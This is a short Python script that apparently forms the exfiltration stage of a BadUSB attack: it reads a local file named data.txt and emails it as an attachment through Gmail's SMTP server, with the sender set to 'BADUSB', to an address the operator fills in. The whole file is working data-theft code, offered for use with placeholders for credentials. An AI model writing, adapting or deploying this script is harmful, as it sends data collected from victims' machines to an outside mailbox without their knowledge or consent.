from email.message import EmailMessage
import smtplib
def email_sender():
    
    gmail_user = "YOUR_GMAIL" #paste your gmail email adress
    gmail_password = "YOUR_APP_PASSWORD" #paste your application password
    
    msg = EmailMessage()
    msg['Subject'] = "Data"
    msg['From'] = "BADUSB"
    msg['To'] = "YOUR_EMAIL_ADDRESS" #paste your email to recive a message
    msg.set_content("Dane")

    file_path = r'data.txt'
    with open(file_path, 'rb') as file:
        file_data = file.read()
        file_name = "Data.txt"
        msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.send_message(msg)
        server.close()

        print('SUCCESS')
            
    except:
        print('Error with gmail')

email_sender()